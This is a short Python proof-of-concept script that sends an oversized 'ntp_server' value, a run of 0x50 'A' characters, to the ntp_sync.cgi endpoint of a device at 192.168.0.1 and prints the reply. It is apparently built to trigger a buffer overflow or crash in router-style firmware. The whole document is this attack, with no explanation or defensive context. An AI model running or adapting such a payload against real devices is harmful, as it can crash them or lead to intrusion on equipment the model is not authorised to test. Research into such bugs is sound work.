#!/usr/bin/env python3

import requests

ip = "http://192.168.0.1/"
url = ip + 'ntp_sync.cgi '

command = 'A'* 0x50

payload = {
    'ntp_server': command,
}

r = requests.post(url, data=payload)
print(r.headers)
print(r.text)
